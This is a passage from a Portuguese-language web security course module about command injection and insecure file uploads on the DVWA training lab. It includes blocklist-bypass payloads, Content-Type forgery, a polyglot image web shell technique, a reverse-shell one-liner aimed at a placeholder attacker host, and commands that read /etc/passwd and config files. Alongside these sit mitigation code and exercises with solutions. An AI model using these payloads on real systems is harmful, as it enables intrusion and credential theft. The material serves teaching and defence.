+por vez"). Para refazer do zero — e apagar a web shell que você subiu — use
+**Resetar**, que recria o alvo. Pelo terminal, é `scripts/lab.sh down dvwa`.
+
+## 6. Variações e aprofundamento
+
+As missões foram no nível `low`. O mundo real filtra; veja como, usando os outros
+níveis do DVWA como mapa.
+
+### 6.1 Command injection com filtro
+
+**Nível `medium` — a blocklist que esquece o pipe.** O código `medium` remove `;`
+e `&&` da entrada com um `str_replace`:
+
+```php
+$substitutions = array( '&&' => '', ';' => '' );
+$target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+```
+
+É uma <GlossaryTerm term="blocklist">blocklist</GlossaryTerm> (lista do que é
+proibido). O problema das blocklists é esquecer casos: aqui, o `|` não está na
+lista. A saída real do lab, no `medium`:
+
+```text
+127.0.0.1; id     ->  (o ';' é apagado; o id NÃO roda)
+127.0.0.1 | id    ->  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Nível `high` — a blocklist quase completa, e o detalhe fatal.** O `high` proíbe
+muito mais — `&`, `;`, `||`, `$`, `(`, `)`, crases — e até o pipe... mas olhe com
+atenção a entrada da lista:
+
+```php
+$substitutions = array(
+  '||' => '', '&' => '', ';' => '', '| ' => '',  // <- repare: '| ' com um espaço
+  '-' => '', '$' => '', '(' => '', ')' => '', '`' => '',
+);
+```
+
+O que a lista bloqueia é `| ` — pipe **seguido de espaço**. Um pipe **sem** espaço
+depois escapa. A saída real:
+
+```text
+127.0.0.1 | id    ->  (o '| ' é apagado; nada roda)
+127.0.0.1|id      ->  uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+Duas lições: blocklists são frágeis (sempre falta um caso), e um detalhe de
+sintaxe (um espaço) decide a defesa. O nível `impossible`, por contraste, valida
+que a entrada é **quatro números separados por ponto** (uma allowlist de formato)
+e nunca a entrega a um shell — a cura, que a seção 8 detalha.
+
+### 6.2 Upload com filtro
+
+**Nível `medium` — confia no `Content-Type`.** O `medium` só aceita se o
+`Content-Type` do upload for `image/jpeg` ou `image/png`. Mas esse campo vem do
+**cliente**, no corpo `multipart/form-data` da requisição — e tudo que vem do
+cliente é forjável (a lição de 4.1). Intercepte o upload no Burp (2.5) e troque a
+linha `Content-Type: application/x-php` por `Content-Type: image/jpeg`, mantendo o
+conteúdo `.php`. A saída real do lab:
+
+```text
+shell.php com Content-Type application/x-php -> "We can only accept JPEG or PNG images."
+shell.php com Content-Type image/jpeg (forjado) -> "...shell.php succesfully uploaded!"
+```
+
+**Nível `high` — extensão + imagem de verdade.** O `high` checa a extensão (tem
+que terminar em `jpg`, `jpeg` ou `png`) **e** roda `getimagesize()`, que falha se
+o arquivo não for uma imagem válida. Subir um `.php` puro não passa. A técnica
+clássica é criar um arquivo que é **imagem válida E contém PHP**: pegue um JPEG de
+verdade e acrescente a web shell nos bytes finais (ou nos
+<GlossaryTerm term="magic bytes">magic bytes</GlossaryTerm> / metadados), salvando
+como `shell.php.jpg`. O `getimagesize()` vê um JPEG legítimo e aceita. **Mas**
+isso, sozinho, **não** dá RCE: o arquivo foi salvo com extensão `.jpg`, e o Apache
+serve `.jpg` como imagem — não executa o PHP dentro. Para executar, é preciso
+**encadear** com outra falha — tipicamente um *file inclusion* (LFI), em que outra
+página é levada a **incluir** o seu `.jpg` como código PHP. É um ótimo exemplo de
+como falhas se combinam (o tema do mini-projeto 4.10).
+
+### 6.3 Blind, reverse shell e ferramentas
+
+- **Command injection cega (blind).** Às vezes a saída do comando não aparece na
+  página. Como na SQLi blind (4.2), você infere: faça o servidor "dormir"
+  (`; sleep 5`) e meça o tempo da resposta, ou mande a saída para fora por uma
+  requisição que você observe (*out-of-band*).
+- **Da web shell à reverse shell.** Uma web shell por URL é desconfortável. O
+  passo seguinte é usá-la para abrir uma
+  <GlossaryTerm term="reverse shell">reverse shell</GlossaryTerm> — um terminal
+  interativo que se conecta de volta ao Kali (`cmd=bash -c 'bash -i >& /dev/tcp/ATACANTE/4444 0>&1'`,
+  com um `nc -lvnp 4444` ouvindo). É o assunto de 2.7.
+- <GlossaryTerm term="argument injection">**Argument injection.**</GlossaryTerm>
+  Mesmo sem metacaractere, injetar uma **opção** no comando pode bastar: se a
+  aplicação roda `cat $arquivo` e você controla `$arquivo`, passar `-rf` ou uma
+  flag do programa muda o comportamento. Combate-se com `--` e `./` antes dos
+  nomes.
+- **Automação.** Assim como o <GlossaryTerm term="sqlmap">sqlmap</GlossaryTerm>
+  automatiza SQLi, há ferramentas (como o *commix*) que automatizam a detecção e a
+  exploração de command injection. Use só com autorização — e saiba o que elas
+  fazem, que é o que esta seção ensinou.
+
+## 7. Erros comuns
+
+- **"Mandei `; id` e só vi o ping."** O nível pode não ser `low`, ou o separador
+  está filtrado. Teste outros metacaracteres (`|`, `&`, `` `id` ``); no `medium`
+  use `|`, no `high` use `|` **sem** espaço.
+- **"A web shell dá 404."** O arquivo não está onde você pensa. A mensagem de
+  upload diz o caminho (`hackable/uploads/`); confira o nome exato (sem `.txt`
+  que o editor às vezes anexa) e acesse `http://dvwa/hackable/uploads/<nome>`.
+- **"A web shell aparece como texto, não executa."** Ela foi salva com extensão
+  que o servidor não trata como PHP (ex.: `.jpg`, caso do `high`), ou numa pasta
+  sem execução. Sem execução de PHP, não há RCE — é o ponto da seção 6.2.
+- **"No `medium` o upload é recusado."** Você mandou o `Content-Type` real
+  (`application/x-php`). Intercepte no Burp e troque para `image/jpeg`.
+- **"O `cat` do config não mostra nada."** O caminho relativo está errado. A
+  partir de `vulnerabilities/exec/`, a raiz é `../../`; o arquivo é
+  `../../config/config.inc.php`. Teste antes `; ls ../../` para ver as pastas.
+- **"Submeti a flag e deu errado."** Confira o formato: a da Missão 1 é
+  `FLAG{db_user-db_password}` (atenção ao `0`/zero da senha do banco); a da
+  Missão 2 é `FLAG{versao-dvwa-versao-php}`, as duas versões com um hífen, sem
+  espaços.
+
+## 8. Defesa e mitigação
+
+Agora a metade que fecha o ciclo. As duas falhas têm curas diferentes, mas a
+mesma filosofia: **não deixar o dado virar comando** e **não confiar no cliente**.
+
+### 8.1 Command injection: não entregue strings a um shell
+
+A causa é montar uma linha e entregá-la a um shell. A cura é **não usar o shell**:
+chame o programa diretamente, passando o executável e cada argumento como itens
+**separados** de uma lista. Assim o sistema operacional recebe "o programa `ping`,
+com o argumento `127.0.0.1; cat /etc/passwd`" — e esse argumento é tratado como um
+único texto (um nome de host inválido, que falha), nunca como vários comandos.
+
+```python
+# VULNERÁVEL: monta uma string e chama o shell.
+import os
+os.system("ping -c 4 " + ip)          # ip = "127.0.0.1; cat /etc/passwd" -> RCE
+
+# SEGURO: sem shell; argumentos como lista.
+import subprocess
+subprocess.run(["ping", "-c", "4", ip], shell=False)   # ip é SÓ um argumento
+```
+
+```php
+// VULNERÁVEL (dvwa/exec/low.php): entrega a string a um shell.
+$cmd = shell_exec('ping  -c 4 ' . $target);
+
+// MELHOR: valide o formato e escape; melhor ainda, não chame o shell.
+if (filter_var($target, FILTER_VALIDATE_IP)) {        // allowlist: só um IP válido
+    $cmd = shell_exec('ping -c 4 ' . escapeshellarg($target));
+}
+```
+
+O `escapeshellarg()` protege o argumento, mas a defesa de fundo é a combinação:
+**(1) não passar por um shell**; **(2)** quando for inevitável, **validar por
+allowlist** (aqui, "tem que ser um IP") e **escapar**. O `impossible.php` do DVWA
+faz a validação: quebra a entrada em quatro octetos e exige que cada um seja
+número — só então monta o IP e pinga.
+
+### 8.2 Upload: allowlist, renomear e isolar
+
+Contra o upload inseguro, nenhuma checagem sozinha basta — some várias, todas no
+servidor:
+
+1. **Allowlist de tipo, pelo conteúdo.** Aceite só as extensões de que precisa
+   (`jpg`, `png`) e confirme o tipo real pelos
+   <GlossaryTerm term="magic bytes">magic bytes</GlossaryTerm> / `getimagesize()`,
+   **nunca** pela extensão ou pelo `Content-Type` do cliente. Uma
+   <GlossaryTerm term="blocklist">blocklist</GlossaryTerm> de extensões perigosas
+   (`.php`) falha: sobram `.phtml`, `.php5`, `.phar`...
+2. **Renomeie o arquivo.** Gere um nome aleatório no servidor e descarte o nome
+   (e a extensão) que o atacante mandou. Assim ele não escolhe o `.php`. É o que o
+   `impossible.php` do DVWA faz com `bin2hex(random_bytes(16))`.
+3. **Guarde fora da raiz web, ou sem execução.** Se os uploads ficam num
+   diretório que o servidor **não executa** (ou fora da *document root*, servidos
+   por um *handler* que só devolve bytes), um `.php` ali é inofensivo. Em Apache,
+   desligar o motor de PHP na pasta de uploads corta o vetor na raiz.
+4. **Re-encode quando possível.** Para imagens, reprocessar o arquivo
+   (`imagecreatefromjpeg` + `imagejpeg`) descarta qualquer código embutido nos
+   metadados — exatamente o que o `impossible.php` faz. Some um
+   <GlossaryTerm term="CSRF token">token anti-CSRF</GlossaryTerm> e um limite de
+   tamanho.
+
+### 8.3 Defesas em profundidade (somam, não substituem)
+
+- **Menor privilégio.** O processo web roda como um usuário sem poderes
+  (`www-data`), e não como root — assim, um RCE não vira dono da máquina de
+  imediato. É a <GlossaryTerm term="least privilege">least privilege</GlossaryTerm>
+  que limitou o estrago no DVWA (e que faltou no caso PAN-OS, onde era root).
+- **WAF como rede, não como cura.** Um <GlossaryTerm term="WAF">WAF</GlossaryTerm>
+  barra padrões óbvios (`; cat`, `.php` no upload), mas é contornável — ganha
+  tempo, não conserta o código.
+- **Detecção.** Vigie arquivos novos e inesperados nos diretórios de upload
+  (como no caso HAFNIUM), processos-filho estranhos saindo do servidor web, e
+  requisições com metacaracteres de shell nos parâmetros. São os indícios de que
+  uma das duas falhas está sendo explorada.
+
+## 9. Exercícios
+
+As duas flags do módulo saem do laboratório (seção 5): a **Missão 1** (command
+injection, ler o `config.inc.php`) e a **Missão 2** (upload → RCE, as versões).
+Se ainda não as pegou, volte lá — elas contam para concluir o módulo. Abaixo, o
+quiz e dois exercícios de fixação.
+
+<Quiz task="quiz-final" />
+
+**Exercício A (prático, no lab).** No nível `high` da *Command Injection*, descubra
+um payload que execute `id` apesar da blocklist. Confirme pela saída.
+
+<Solution title="Solução do Exercício A">
+A blocklist do `high` remove `| ` (pipe com espaço), mas não o pipe colado. Envie
+`127.0.0.1|id` (sem espaço depois do `|`). A página devolve
+`uid=33(www-data) gid=33(www-data) groups=33(www-data)`. Moral: a blocklist
+esqueceu um caso — elas quase sempre esquecem.
+</Solution>
+
+**Exercício B (teoria).** No nível `high` do *File Upload*, você consegue subir um
+`shell.php.jpg` que é uma imagem JPEG válida com PHP embutido. Por que isso,
+**sozinho**, não lhe dá RCE? O que mais seria preciso?
+
+<Solution title="Solução do Exercício B">
+Porque o arquivo foi salvo com extensão `.jpg`, e o Apache serve `.jpg` como
+imagem — ele não executa o PHP embutido. Faltaria **encadear** com outra falha que
+faça o servidor interpretar o seu arquivo como código: tipicamente um *file
+inclusion* (LFI), em que outra página é induzida a **incluir** o `.jpg`, ou uma má
+configuração que execute `.jpg` como PHP. É o princípio de encadear falhas (4.10).
+</Solution>
+
+## 10. Resumo e glossário
+
+**Pontos-chave:**
+
+- **Command injection** nasce quando a aplicação monta uma linha de comando
+  concatenando a entrada e a entrega a um **shell**; metacaracteres como `;`, `|`
+  e `&` transformam o dado em comandos novos. É a mesma mistura de canais da SQLi.
+- **Upload inseguro** vira **RCE** quando um arquivo de código (uma **web shell**)
+  é gravado numa pasta que o servidor executa e depois é requisitado. Subir e
+  executar são dois passos.
+- As duas levam a **RCE** — o destino mais perigoso — e muitas vezes se **encadeiam**
+  (como na CVE-2024-3400: criar arquivo → injetar comando → root).
+- Defesas fracas: **blocklist** de caracteres/extensões, confiar no `Content-Type`
+  ou na extensão, validar só no cliente. Todas contornáveis.
+- Defesas que funcionam: **não entregar strings a um shell** (argumentos como
+  lista) e **validar uploads** por allowlist + conteúdo (magic bytes) + renomear +
+  isolar a pasta. Menor privilégio e detecção **somam**.
+
+### Termos deste módulo
+
+<ModuleGlossary />
+
+### Para ir além
+
+- [OWASP — OS Command Injection Defense Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html) — a defesa em código, por linguagem.
+- [OWASP — File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html) — como validar uploads de verdade.
+- [MITRE — CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html) e [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html) — as definições formais.
+- [PortSwigger Web Security Academy — OS command injection](https://portswigger.net/web-security/os-command-injection) e [File upload vulnerabilities](https://portswigger.net/web-security/file-upload) — laboratórios gratuitos.
